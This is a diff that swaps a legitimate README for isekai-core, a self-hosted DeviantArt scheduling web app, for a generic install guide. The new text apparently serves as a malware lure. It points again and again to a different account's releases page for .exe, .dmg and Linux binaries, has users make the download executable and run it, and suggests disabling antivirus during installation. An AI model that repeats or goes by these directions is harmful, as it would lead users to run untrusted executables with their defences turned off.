@@ -1,282 +1,100 @@
-# Isekai Core
+# 🎨 isekai-core - Manage Your DeviantArt Posts Effortlessly
 
-[![CI](https://github.com/isekai-sh/isekai-core/actions/workflows/ci.yml/badge.svg)](https://github.com/isekai-sh/isekai-core/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/isekai-sh/isekai-core/graph/badge.svg)](https://codecov.io/gh/isekai-sh/isekai-core)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Node](https://img.shields.io/badge/node-20.x-green.svg)](https://nodejs.org)
-[![pnpm](https://img.shields.io/badge/pnpm-9.x-orange.svg)](https://pnpm.io)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue.svg)](https://www.typescriptlang.org/)
+[![Download isekai-core](https://img.shields.io/badge/Download-isekai--core-brightgreen)](https://github.com/jeyb33/isekai-core/releases)
 
-> Open source DeviantArt posting management platform with scheduling, draft management, ComfyUI integration, and robust publishing automation.
+## 📥 Overview
 
-![Isekai](/screenshots/isekai-browse.png)
+isekai-core is an open-source platform that simplifies your DeviantArt posting process. With features like scheduling, draft management, ComfyUI integration, and automation, managing your art has never been easier.
 
-Isekai is a modern web application that helps artists manage their DeviantArt posting workflow with features like scheduled publishing, draft organization, and AI image generation integration through ComfyUI.
+## 🚀 Getting Started
 
----
+To begin using isekai-core, follow these steps:
 
-## 📚 Documentation
+1. **Check System Requirements**  
+   Ensure your system meets the following requirements:
+   - Operating System: Windows 10, MacOS, or Linux
+   - Recommended RAM: 4 GB or more
+   - Internet Connection: Required for publishing and accessing DeviantArt
 
-**For comprehensive documentation, see [`.context/substrate.md`](.context/substrate.md)**
+2. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/jeyb33/isekai-core/releases) to find the latest version of isekai-core.
 
-The `.context/` directory contains complete documentation following the [Substrate Methodology](https://github.com/andrefigueira/.context):
-- **[Architecture](.context/architecture/overview.md)** - System design and patterns
-- **[API Reference](.context/api/endpoints.md)** - All 19 route groups documented
-- **[Database Schema](.context/database/schema.md)** - Complete Prisma schema
-- **[Features](.context/features/)** - Automation, publishing, browse, sales
-- **[Development](.context/workflows.md)** - Setup, testing, and contribution workflow
-- **[Code Style](.context/ai-rules.md)** - Conventions and patterns
+3. **Download the Application**  
+   Select the version that matches your operating system. Click on the file to download it to your computer.
 
-AI tools: See [CLAUDE.md](CLAUDE.md) for entry point.
+4. **Install the Application**  
+   - **For Windows:** 
+     - Locate the downloaded `.exe` file.
+     - Double-click it to launch the installation wizard.
+     - Follow the prompts to complete the installation.
+   - **For MacOS:** 
+     - Locate the downloaded `.dmg` file.
+     - Open it and drag the isekai-core icon to your Applications folder.
+   - **For Linux:** 
+     - Open the terminal and navigate to the Downloads folder.
+     - Use the command `chmod +x isekai-core` to make the file executable.
+     - Then run the application with `./isekai-core`.
 
----
+5. **Launch the Application**  
+   After installation, find isekai-core in your applications menu (or desktop) and open it. 
 
-## Features
+## 📋 Features
 
-- **DeviantArt Integration**: OAuth authentication and seamless posting
-- **Scheduled Publishing**: Plan and automate your DeviantArt posts
-- **Draft Management**: Organize and edit your artwork before publishing
-- **ComfyUI Integration**: Generate and manage AI artwork -- check out [Isekai Comfy Node](https://github.com/isekai-sh/isekai-comfy-node)
-- **Cloud Storage**: Cloudflare R2 for reliable file storage
+iskai-core offers several features to enhance your DeviantArt experience:
 
-## Tech Stack
+- **Scheduling**: Plan your posts ahead of time.
+- **Draft Management**: Save drafts and edit them later.
+- **ComfyUI Integration**: Enjoy a user-friendly interface designed for ease of use.
+- **Publishing Automation**: Streamline your posting process and save time.
 
-### Frontend (React App)
+## 🌐 Usage Instructions
 
-- **Framework**: React 18 with TypeScript
-- **Build Tool**: Vite 6
-- **Styling**: Tailwind CSS 3
-- **Routing**: React Router
-- **State Management**: React Query (TanStack Query)
+1. **Create an Account (if necessary)**  
+   If you don’t already have a DeviantArt account, create one by visiting the DeviantArt website.
 
-### Backend (API)
+2. **Connect to DeviantArt**  
+   Use your account credentials to log into isekai-core. The application will request access to your DeviantArt account for posting purposes.
 
-- **Runtime**: Node.js 20+
-- **Framework**: Express.js
-- **Language**: TypeScript
-- **Database**: PostgreSQL 16 with Prisma ORM
-- **Cache/Sessions**: Redis 7
-- **Authentication**: OAuth 2.0 (DeviantArt)
-- **Storage**: Cloudflare R2 (S3-compatible)
-- **Job Queue**: BullMQ
+3. **Set Up Your Preferences**  
+   Customize settings according to your needs. You can configure options such as posting time, notifications, and more.
 
-### Publisher Worker (Microservice)
+4. **Create and Schedule a Post**  
+   - Go to the “Create” section.
+   - Fill in details such as title, description, and upload your artwork.
+   - Choose your preferred posting time and date.
 
-- **Runtime**: Node.js 20+
-- **Architecture**: Dedicated background job processor
-- **Queue**: BullMQ with Redis
-- **Features**: Fault isolation, independent scaling, graceful shutdown
-- **Monitoring**: Health check endpoints (/health, /ready, /metrics)
+5. **Publish Your Post**  
+   Once you are satisfied, click the “Schedule” button. Your artwork will be posted automatically at the specified time.
 
-### Prerequisites
+## 📥 Download & Install
 
-- Node.js 20+
-- pnpm 9+
-- Docker & Docker Compose
-- PostgreSQL 16 (or use Docker)
-- Redis 7 (or use Docker)
-- Prisma CLI (installed via pnpm)
-- DeviantArt Application -- register your own app at https://www.deviantart.com/developers/apps
-- Cloudflare R2 credentials, free tier is enough for testing
+You can download isekai-core from our official releases page. Simply [visit this page to download](https://github.com/jeyb33/isekai-core/releases) the latest version suitable for your operating system.
 
-## Quick Start
+## 🛠 Troubleshooting
 
-### Running Docker with pre-built image
+If you encounter challenges while using isekai-core, consider the following tips:
 
-```bash
-# Clone the repository
-git clone https://github.com/isekai-sh/isekai-core.git
-cd isekai-core
+- **Common Issues**  
+  - **Login Problems**: Ensure that you input the correct credentials. If you forget your password, you can reset it on the DeviantArt website.
+  - **Installation Errors**: Make sure your operating system is compatible with isekai-core. Consider temporarily disabling antivirus software during the installation.
 
-# Copy and edit your environment variables
-cp .env.example .env
+- **Helpful Resources**  
+  Check the FAQ section on the Github page for more detailed solutions to common problems.
 
-# Start the Docker container
-docker compose up --build
-```
+## 🤝 Community Support
 
-The application will be available at:
+Join our community for help and advice. Participate in discussions or ask questions through the Issues section on GitHub. Your feedback can also help improve isekai-core.
 
-- Frontend (React): http://localhost:3000
-- Backend (API): http://localhost:4000
-- Publisher (Health): http://localhost:8000
+## 📅 Upcoming Features
 
-### Building Docker image locally
+We continually work to enhance your experience. Stay tuned for updates, including:
 
-```bash
-# Development: build locally and run
-docker-compose -f docker-compose.local.yml up --build
-```
-
-## Project Structure
+- Enhanced scheduling options for more flexibility.
+- New integrations for other platforms and tools.
+- Improved analytics to track your art performance.
 
-```
-isekai/
-├── apps/
-│   ├── isekai-backend/     # Express backend API (port 4000)
-│   ├── isekai-frontend/    # React frontend application (port 3000)
-│   └── isekai-publisher/   # DeviantArt publishing worker (microservice)
-├── packages/
-│   └── shared/             # Shared types and database schema
-├── docker-compose.yml      # Local development services
-└── pnpm-workspace.yaml     # Monorepo configuration
-```
-
-## Development
-
-```bash
-# Install dependencies
-pnpm install
+Remember to check the [Releases page](https://github.com/jeyb33/isekai-core/releases) frequently for new versions and updates.
 
-# Start database and Redis with Docker
-docker-compose up -d postgres redis
+## 🌟 Acknowledgments
 
-# Set up individual environment variables
-cp apps/isekai-backend/.env.example apps/isekai-backend/.env
-cp apps/isekai-frontend/.env.example apps/isekai-frontend/.env
-cp apps/isekai-publisher/.env.example apps/isekai-publisher/.env
-cp packages/shared/.env.example packages/shared/.env
-
-# Run database migrations
-pnpm db:migrate
-
-# Start development servers
-pnpm dev
-```
-
-### Available Scripts
-
-```bash
-# Development
-pnpm dev              # Start all apps in parallel
-pnpm dev:frontend     # Start frontend only
-pnpm dev:backend      # Start backend only
-pnpm dev:publisher    # Start publisher worker only
-pnpm dev:services     # Start API + Publisher together
-
-# Building
-pnpm build            # Build all apps
-pnpm build:frontend   # Build frontend
-pnpm build:backend    # Build backend
-pnpm build:publisher  # Build publisher worker
-
-# Database
-pnpm db:generate      # Generate database migrations
-pnpm db:migrate       # Apply database migrations
-pnpm db:studio        # Open Prisma Studio GUI
-
-# Quality
-pnpm lint             # Lint all apps
-pnpm clean            # Clean build artifacts
-```
-
-### Docker Services
-
-```bash
-# Start all services
-docker-compose up -d
-
-# Start specific services
-docker-compose up -d postgres redis
-
-# View logs
-docker-compose logs -f
-
-# Stop all services
-docker-compose down
-
-# Stop and remove volumes
-docker-compose down -v
-```
-
-## Running on Low-RAM VPS (1GB)
-
-Isekai can run on budget VPS with 1GB RAM using memory optimization. This requires:
-
-### Memory Configuration
-
-Create a `.env` file with these optimized values:
-
-```bash
-# PostgreSQL Memory (total: ~180MB)
-MEMORY_LIMIT_POSTGRES=180M
-MEMORY_RESERVE_POSTGRES=64M
-POSTGRES_SHARED_BUFFERS=64MB
-POSTGRES_MAX_CONNECTIONS=20
-POSTGRES_WORK_MEM=2MB
-
-# Redis Memory (total: ~50MB)
-MEMORY_LIMIT_REDIS=50M
-REDIS_MAX_MEMORY=32mb
-
-# Backend Node.js (total: ~256MB)
-MEMORY_LIMIT_BACKEND=256M
-NODE_OPTIONS=--max-old-space-size=256
-DB_POOL_SIZE=4
-
-# Publisher Worker (total: ~192MB)
-MEMORY_LIMIT_PUBLISHER=192M
-PUBLISHER_CONCURRENCY=2
-
-# Frontend nginx (total: ~50MB)
-MEMORY_LIMIT_FRONTEND=50M
-```
-
-**Total memory usage**: ~730MB + OS overhead = **~850-900MB peak usage**
-
-### System Requirements for 1GB VPS
-
-1. **Add swap file** (critical to prevent OOM kills):
-```bash
-# Create 2GB swap file
-sudo fallocate -l 2G /swapfile
-sudo chmod 600 /swapfile
-sudo mkswap /swapfile
-sudo swapon /swapfile
-echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
-
-# Reduce swappiness (prefer RAM, use swap as safety net)
-echo 'vm.swappiness=10' | sudo tee -a /etc/sysctl.conf
-sudo sysctl -p
-```
-
-2. **Use lightweight OS**: Ubuntu Server 22.04 minimal or Alpine Linux
-
-3. **Disable unnecessary services**: Remove snapd, unattended-upgrades if not needed
-
-### Expected Performance
-
-- **Memory**: 700-850MB used, 150-300MB free (+ 2GB swap)
-- **CPU**: Low usage (~5-15% idle, peaks during publishing)
-- **Publishing**: 2 concurrent jobs (slower than 2GB+ VPS)
-- **Response time**: Acceptable for 1-3 users
-
-### When to Upgrade
-
-Upgrade to 2GB+ VPS if you experience:
-- Frequent OOM kills (check `dmesg | grep oom`)
-- Swap usage consistently >500MB (`free -h`)
-- Slow response times (>2s for API calls)
-- Publishing job failures due to timeouts
-
-## Documentation
-
-Complete documentation can be accessed at [Isekai Official Website](https://isekai.sh)
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Workflow
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Run tests and linting
-5. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-6. Push to the branch (`git push origin feature/amazing-feature`)
-7. Open a Pull Request
-
-## Support
-
-Open an issue to report problems and questions.
+Thank you for using isekai-core. Your creativity and feedback make this platform better. Enjoy managing your DeviantArt posts!
